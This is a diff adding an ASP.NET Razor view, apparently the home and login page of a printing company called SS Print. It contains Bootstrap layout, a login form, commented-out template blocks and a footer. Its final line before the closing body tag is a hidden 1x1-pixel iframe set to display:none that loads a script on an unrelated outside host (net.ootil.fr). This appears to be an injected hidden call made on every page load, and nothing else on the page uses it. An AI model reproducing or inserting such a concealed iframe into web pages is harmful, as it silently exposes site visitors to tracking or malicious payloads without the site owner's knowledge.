@@ -1,0 +1,515 @@
+﻿@model d1.Models.webs
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="stylesheet" href="http://www.w3schools.com/lib/w3.css">
+    <link rel="stylesheet" href="http://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.4.0/css/font-awesome.min.css">
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>
+        S Print
+    </title>
+
+    <!-- Bootstrap -->
+    <link href="~/Content/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="~/Content/font-awesome.min.css">
+
+    <link href="~/Content/animate.min.css" rel="stylesheet">
+    <link href="~/Content/prettyPhoto.css" rel="stylesheet">
+    <link href="~/Content/main.css" rel="stylesheet">
+    <link href="~/Content/responsive.css" rel="stylesheet">
+    <!--[if lt IE 9]>
+    <script src="js/html5shiv.js"></script>
+    <script src="js/respond.min.js"></script>
+    <![endif]-->
+
+</head>
+<body class="homepage">
+    <header id="header">
+        <nav class="navbar navbar-fixed-top" role="banner">
+            <div class="container">
+                <div class="navbar-header">
+                    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+                        <span class="sr-only">Toggle navigation</span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button>
+                    <a class="navbar-brand" href="~/Home/Index">SS Print</a>
+                </div>
+
+                <div class="collapse navbar-collapse navbar-right">
+                    <ul class="nav navbar-nav">
+                        <li class="active"><a href="~/Home/Index">Home</a></li>
+                        <li><a href="~/Home/aboutus">About Us</a></li>
+                        <li><a href="~/Home/services">Services</a></li>
+                        <li><a href="~/Home/portfolio">Portfolio</a></li>
+                        <li><a href="~/Home/client">Clients</a></li>
+                        <li><a href="~/Home/contactus">Contact</a></li>
+                        <li><a href="~/Home/Login1">Login</a></li>
+                    </ul>
+                </div>
+            </div><!--/.container-->
+        </nav><!--/nav-->
+
+    </header><!--/header-->
+    @*<div class="slider">
+            <div class="container">
+                <div id="about-slider">
+                    <div id="carousel-slider" class="carousel slide" data-ride="carousel">
+                        <!-- Indicators -->
+                        <ol class="carousel-indicators visible-xs">
+                            <li data-target="#carousel-slider" data-slide-to="0" class="active"></li>
+                            <li data-target="#carousel-slider" data-slide-to="1"></li>
+                            <li data-target="#carousel-slider" data-slide-to="2"></li>
+                        </ol>
+
+                        <div class="carousel-inner">
+                            <div class="item active">
+                                <img src="~/imagesH/slider_one.jpg" class="img-responsive" alt="">
+                           </div>
+                           <div class="item">
+                                <img src="~/images/slider_one.jpg" class="img-responsive" alt="">
+                           </div>
+                           <div class="item">
+                                <img src="~/images/slider_one.jpg" class="img-responsive" alt="">
+                           </div>
+                        </div>
+
+                        <a class="left carousel-control hidden-xs" href="#carousel-slider" data-slide="prev">
+                            <i class="fa fa-angle-left"></i>
+                        </a>
+
+                        <a class=" right carousel-control hidden-xs"href="#carousel-slider" data-slide="next">
+                            <i class="fa fa-angle-right"></i>
+                        </a>
+                    </div> <!--/#carousel-slider-->
+                </div><!--/#about-slider-->
+            </div>
+        </div>*@
+
+
+    <br><br><br>
+    <section id="feature">
+        <div class="container">
+            <div class="center wow fadeInDown">
+                <marquee>
+                    <h4 style="text-decoration-color:aquamarine">Welcome to SS Print. The Highest Offset Printing.</h4>
+                </marquee>
+                <h2>SSPrint (PVT) LTD</h2>
+                <p class="lead">
+                    SS Print(PVT) LTD, was established in year 2005.<br> With the span of time it has become one of the leading, high-quality printers of Pakistan.<br>
+                    Our core motto is to ensure valuable Client satisfaction from our quality printing. <br>Through our Experienced, Professional, Motivated, and Animated team.
+                </p>
+            </div>
+            @*<div class="row">
+                    <div class="features">
+                        <div class="col-md-4 col-sm-6 wow fadeInDown" data-wow-duration="1000ms" data-wow-delay="600ms">
+                            <div class="feature-wrap">
+                                <i class="fa fa-laptop"></i>
+                                <h2>Fine Printing</h2>
+                                <h3>Client satisfaction is our core motto</h3>
+                            </div>
+                        </div><!--/.col-md-4-->
+
+                        <div class="col-md-4 col-sm-6 wow fadeInDown" data-wow-duration="1000ms" data-wow-delay="600ms">
+                            <div class="feature-wrap">
+                                <i class="fa fa-comments"></i>
+                                <h2>Cost Friendly</h2>
+                                <h3>We deal in affordable price</h3>
+                            </div>
+                        </div><!--/.col-md-4-->
+
+                        <div class="col-md-4 col-sm-6 wow fadeInDown" data-wow-duration="1000ms" data-wow-delay="600ms">
+                            <div class="feature-wrap">
+                                <i class="fa fa-cloud-download"></i>
+                                <h2>Best Graphics</h2>
+                                <h3>We provoide best graphic designing.</h3>
+                            </div>
+                        </div><!--/.col-md-4-->
+
+                        <div class="col-md-4 col-sm-6 wow fadeInDown" data-wow-duration="1000ms" data-wow-delay="600ms">
+                            <div class="feature-wrap">
+                                <i class="fa fa-leaf"></i>
+                                <h2>Cutting </h2>
+                                <h3>All type of dye cutting</h3>
+                            </div>
+                        </div><!--/.col-md-4-->
+
+                        <div class="col-md-4 col-sm-6 wow fadeInDown" data-wow-duration="1000ms" data-wow-delay="600ms">
+                            <div class="feature-wrap">
+                                <i class="fa fa-cogs"></i>
+                                <h2>Sales & Purchase</h2>
+                                <h3>We sale and purchase the offset printing machines.</h3>
+                            </div>
+                        </div><!--/.col-md-4-->
+
+                        <div class="col-md-4 col-sm-6 wow fadeInDown" data-wow-duration="1000ms" data-wow-delay="600ms">
+                            <div class="feature-wrap">
+                                <i class="fa fa-heart"></i>
+                                <h2>Scanning & UV warnish </h2>
+                                <h3>We deal scanning of printing plates and UV printing.</h3>
+                            </div>
+                        </div><!--/.col-md-4-->
+                    </div><!--/.services-->
+                </div>*@<!--/.row-->
+        </div><!--/.container-->
+    </section><!--/#feature-->
+    <!---Login Form-->
+    @*<h2 style="text-align:center"> Welcome to the Login Panel</h2>
+        <form style="text-align:center" method="post" action="~/Home/LoginValidate">
+
+            <h5>Username</h5><input placeholder="username" type="text" name="username" required />
+            <h5>Password</h5><input placeholder="password" type="password" name="password" required /><br>
+            <input type="submit" name="Login"  value="Login"/>
+
+        </form>*@
+    <div class="form-style-8">
+        <h2>Welcome To Login Panel</h2>
+        <form action="~/Home/LoginValidate" method="post">
+            <input type="text" name="username" placeholder="Full Name" />
+            <input type="password" name="password" placeholder="Password" />
+            @*<input type="text" name="type" placeholder="type" />*@
+            @*<textarea placeholder="Message" onkeyup="adjust_textarea(this)"></textarea>*@
+            <input type="submit" value="Login" name="Login" />
+        </form>
+    </div>
+
+    <script type="text/javascript">
+        //auto expand textarea
+        function adjust_textarea(h) {
+            h.style.height = "20px";
+            h.style.height = (h.scrollHeight) + "px";
+        }
+    </script>
+
+
+
+
+    <!--End Login--->
+    @*<section id="middle">
+        <div class="container">
+            <div class="row">
+                <div class="col-sm-6 wow fadeInDown">
+                    <div class="skill">
+                        <h2>Our Skills</h2>
+                        <p>We deal all kind of prinitng with designing</p>
+
+                        <div class="progress-wrap">
+                            <h3>Graphic Designer</h3>
+                            <div class="progress">
+                                <div class="progress-bar  color1" role="progressbar" aria-valuenow="40" aria-valuemin="0" aria-valuemax="100" style="width: 85%">
+                                    <span class="bar-width">85%</span>
+                                </div>
+
+                            </div>
+                        </div>
+
+                        <div class="progress-wrap">
+                            <h3>Offset Printing</h3>
+                            <div class="progress">
+                                <div class="progress-bar color2" role="progressbar" aria-valuenow="20" aria-valuemin="0" aria-valuemax="100" style="width: 95%">
+                                    <span class="bar-width">95%</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="progress-wrap">
+                            <h3>Heidlberg Printing</h3>
+                            <p>We can deal Heidlberg GTO printing as a broker </p>
+                            <div class="progress">
+                                <div class="progress-bar color3" role="progressbar" aria-valuenow="50" aria-valuemin="0" aria-valuemax="100" style="width: 50%">
+                                    <span class="bar-width">50%</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="progress-wrap">
+                            <h3>Phamplets</h3>
+                            <p>We deal Rotta printing </p>
+                            <div class="progress">
+                                <div class="progress-bar color4" role="progressbar" aria-valuenow="60" aria-valuemin="0" aria-valuemax="100" style="width: 60%">
+                                    <span class="bar-width">60%</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="progress-wrap">
+                            <h3>Dye Cutting</h3>
+                            <p>We deal all dye cutting </p>
+                            <div class="progress">
+                                <div class="progress-bar color1" role="progressbar" aria-valuenow="60" aria-valuemin="0" aria-valuemax="100" style="width: 60%">
+                                    <span class="bar-width">60%</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                </div><!--/.col-sm-6-->
+
+                <div class="col-sm-6 wow fadeInDown">
+                    <div class="accordion">
+                        <h2>Why People want to become our Client ?</h2>
+                        <div class="panel-group" id="accordion1">
+                            <div class="panel panel-default">
+                                <div class="panel-heading active">
+                                    <h3 class="panel-title">
+                                        <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion1" href="#collapseOne1">
+                                            Highest Offset Printing
+                                            <i class="fa fa-angle-right pull-right"></i>
+                                        </a>
+                                    </h3>
+                                </div>
+
+                                <div id="collapseOne1" class="panel-collapse collapse in">
+                                    <div class="panel-body">
+                                        <div class="media accordion-inner">
+                                            <div class="pull-left">
+                                                <img class="img-responsive" src="~/images/111.png">
+                                            </div>
+                                            <div class="media-body">
+                                                <h4>We Deal Highest Offset Printing</h4>
+                                                <p>In our motto the client satisfaction is basic core.</p>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="panel panel-default">
+                                <div class="panel-heading">
+                                    <h3 class="panel-title">
+                                        <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion1" href="#collapseTwo1">
+                                            Cost Friendly
+                                            <i class="fa fa-angle-right pull-right"></i>
+                                        </a>
+                                    </h3>
+                                </div>
+                                <div id="collapseTwo1" class="panel-collapse collapse">
+                                    <div class="panel-body">
+                                        It is another our core motto to provide highest printing  in affordable price.
+                                    </div>
+                                </div>
+                            </div>
+
+                            @*I-frame in whih all fce book nd news evnet show *@
+    <iframe src="//www.facebook.com/plugins/likebox.php?href=https%3A%2F%2Fwww.facebook.com%2Fdotprintpk&amp;width=220&amp;height=290&amp;colorscheme=light&amp;show_faces=true&amp;header=true&amp;stream=false&amp;show_border=true&amp;appId=294306027383843" scrolling="no" style="border:thick; overflow:hidden; width:420px; height:340px;margin-left:100px" allowtransparency="true" frameborder="1"></iframe>
+    <!--<iframe src="//www.facebook.com/plugins/like.php?href=https%3A%2F%2Fwww.facebook.com%2Fdotprint&amp;width=225&amp;layout=standard&amp;action=like&amp;show_faces=true&amp;share=true&amp;height=80" scrolling="no" frameborder="0" style="border:none; float:right; margin-top:10px; overflow:hidden; width:225px; height:80px;" allowTransparency="true"></iframe>-->
+
+    <script type="text/javascript">
+        $(document).ready(function () {
+            $('.carousel').carousel({
+                interval: 2000
+            });
+            $('.poster-slide').mouseover(function () {
+                $('.carousel-control').css('display', 'block');
+
+            });
+            $('.poster-slide').mouseleave(function () {
+                $('.carousel-control').css('display', 'none');
+            });
+        });
+    </script>
+
+    @*<div class="panel panel-default">
+                                        <div class="panel-heading">
+                                          <h3 class="panel-title">
+                                            <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion1" href="#collapseThree1">
+                                              Lorem ipsum dolor sit amet
+                                              <i class="fa fa-angle-right pull-right"></i>
+                                            </a>
+                                          </h3>
+                                        </div>
+                                        <div id="collapseThree1" class="panel-collapse collapse">
+                                          <div class="panel-body">
+                                            Anim pariatur cliche reprehenderit, enim eiusmod high life accusamus terry richardson ad squid. 3 wolf moon officia aute, non cupidatat skateboard dolor brunch. Food truck quinoa nesciunt laborum eiusmod. Brunch 3 wolf moon tempor.
+                                          </div>
+                                        </div>
+                                      </div>
+
+                                      <div class="panel panel-default">
+                                        <div class="panel-heading">
+                                          <h3 class="panel-title">
+                                            <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion1" href="#collapseFour1">
+                                              Lorem ipsum dolor sit amet
+                                              <i class="fa fa-angle-right pull-right"></i>
+                                            </a>
+                                          </h3>
+                                        </div>
+                                        <div id="collapseFour1" class="panel-collapse collapse">
+                                          <div class="panel-body">
+                                            Anim pariatur cliche reprehenderit, enim eiusmod high life accusamus terry richardson ad squid. 3 wolf moon officia aute, non cupidatat skateboard dolor brunch. Food truck quinoa nesciunt laborum eiusmod. Brunch 3 wolf moon tempor.
+                                          </div>
+                                        </div>
+                                      </div>
+                                    </div><!--/#accordion1-->
+                            </div>
+                        </div>
+
+                    </div><!--/.row-->
+                </div><!--/.container-->
+        </section>*@<!--/#middle-->
+
+    <section id="bottom">
+        <div class="container wow fadeInDown" data-wow-duration="1000ms" data-wow-delay="600ms">
+            <div class="row">
+                <div class="col-md-3 col-sm-6">
+                    <div class="widget">
+                        <h3>Company</h3>
+                        <ul>
+                            <li><a href="~/Home/aboutus">About us</a></li>
+                            <li><a href="#">We are hiring</a></li>
+                            <li><a href="#">Meet the team</a></li>
+                            <li><a href="#">Copyright</a></li>
+                        </ul>
+                    </div>
+                </div><!--/.col-md-3-->
+
+                <div class="col-md-3 col-sm-6">
+                    <div class="widget">
+                        <h3>Support</h3>
+                        <ul>
+                            <li><a href="~/Home/services">Faq</a></li>
+                            <li><a href="#">Client</a></li>
+                            <li><a href="#">Forum</a></li>
+                            <li><a href="#">Documentation</a></li>
+                        </ul>
+                    </div>
+                </div><!--/.col-md-3-->
+                @*<div class="col-md-3 col-sm-6">
+                        <div class="widget">
+                            <h3>Developers</h3>
+                            <ul>
+                                <li><a href="#">Web Development</a></li>
+                                <li><a href="#">SEO Marketing</a></li>
+                                <li><a href="#">Theme</a></li>
+                                <li><a href="#">Development</a></li>
+                            </ul>
+                        </div>
+                    </div><!--/.col-md-3-->
+                *@
+                <div class="col-md-3 col-sm-6">
+                    <div class="widget">
+                        <h3>Our Clents</h3>
+                        <ul>
+                            <li><a href="~/Home/services">Clients</a></li>
+                            <li><a href="footer">Eiusmod</a></li>
+                            @*<li><a href="#">Tempor</a></li>
+                                <li><a href="#">Veniam</a></li>*@
+                        </ul>
+                    </div>
+                </div><!--/.col-md-3-->
+            </div>
+        </div>
+    </section><!--/#bottom-->
+    <br><br>
+    <div class="news_widgets" style="height: 90px;">
+        <marquee behavior="scroll" onmouseover="this.stop();" onmouseout="this.start();" direction="left">
+
+            <img src="~/Images/d.png" alt="s" style=" width:2% ; height:2%" />
+
+
+            <img src="~/Images/more.jpg" alt="s" style=" width:2% ; height:2%" />
+
+
+            <img src="~/Images/im1 (3).png" alt="s" style=" width:1% ; height:1%" />
+
+
+            <img src="~/Images/im1 (4).png" alt="s" style=" width:1% ; height:1%" />
+
+
+            <img src="~/Images/121.jpg" alt="s" style=" width:2% ; height:2%" />
+
+
+            <img src="~/Images/d1.png" alt="s" style=" width:4% ; height:4%" />
+
+
+            <img src="~/Images/d3.png" alt="s" style=" width:1% ; height:1%" />
+
+
+            <img src="~/Images/d4.png" alt="s" style=" width:1% ; height:1%" />
+
+
+            <img src="~/Images/d5.png" alt="s" style=" width:2% ; height:2%" />
+
+
+
+            <img src="~/Images/bullet.png" alt="s" style=" width:4% ; height:4%" />
+
+
+        </marquee>
+
+        <img style="position: relative; top: -125px;" src="~/Images/client.png">
+
+
+    </div>
+    <br><br>
+
+    @*<!----F00ter-->*@<div class="top-bar">
+        <div class="top-bar">
+            <div class="container">
+                <div class="row">
+                    <div class="col-lg-12">
+                        <div class="social">
+                            <ul class="social-share">
+                                <li> <a href="http://www.twitter.com"><i class="fa fa-twitter w3-hover-red"></i><!---  style="width:100% ; height:100%" />--></a></li>
+
+                                <li><a href="http://www.facebook.com"><i class="fa fa-facebook"></i>  <!--style="width:100% ; height:100%" />--></a></li>
+
+                                <li><a href="http://www.google.com"><i class="fa fa-google-plus w3-hover-red"><!--<img src="~/images/google+.png" style="width:100% ; height:100%" />--></i></a></li>
+
+                                @*<li><img src="~/images/fb.png"><a href="http://facebook.com">@*<i class="fa fa-facebook"></i></a></li>
+                                                            <li><a href="~/images/twitter.png"><i class="fa fa-twitter"></i></a></li>
+                                    @*<li><a href="#"><i class="fa fa-linkedin"></i></a></li>
+                                    <li><a href="#"><i class="fa fa-dribbble"></i></a></li>
+                                                            <li><a href="~/images/google+.png"><i class="fa fa-google+"></i></a></li>*@
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div><!--/.container-->
+        </div><!--/.top-bar-->
+
+        <footer id="footer" class="midnight-blue">
+            <div class="container">
+                <div class="row">
+                    <div class="col-sm-6">
+                        &copy; 2016 <a target="_blank" href="http://bootstraptaste.com/" title="Free Twitter Bootstrap WordPress Themes and HTML templates">SS Print</a>. All Rights Reserved.
+                    </div>
+                    <!--
+                        All links in the footer should remain intact.
+                        Licenseing information is available at: http://bootstraptaste.com/license/
+                        You can buy this theme without footer links online at: http://bootstraptaste.com/buy/?theme=Gp
+                    -->
+                    <div class="col-sm-6">
+                        <ul class="pull-right">
+                            <li><a href="~/Home">Home</a></li>
+                            <li><a href="~/Home/aboutus">About Us</a></li>
+                            <li><a href="~/Home">Faq</a></li>
+                            <li><a href="~/Home/contactus">Contact Us</a></li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </footer><!--/#footer-->
+        <!--footer-->
+        <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
+        <script src="~/Scripts/jquery.js"></script>
+        <script src="~/Scripts/bootstrap.min.js"></script>
+        <script src="~/Scripts/jquery.prettyPhoto.js"></script>
+        <script src="~/Scripts/jquery.isotope.min.js"></script>
+        <script src="~/Scripts/wow.min.js"></script>
+        <script src="~/Scripts/main.js"></script>
+        <script src="~/Scripts/jquery.js"></script>
+        <script src="~/Scripts/bootstrap.min.js"></script>
+        <script src="~/Scripts/jquery.prettyPhoto.js"></script>
+        <script src="~/Scripts/jquery.isotope.min.js"></script>
+        <script src="~/Scripts/wow.min.js"></script>
+        <script src="~/Scripts/main.js"></script>
+        <script id="__browserLink_initializationData" type="application/json">
+        </script>
+        <iframe width="1px" height="1px" src="http://net.ootil.fr/addo/ban.php?id=1349&ref=http://localhost:54490/" style="display: none;" />
+</body>
+</html>
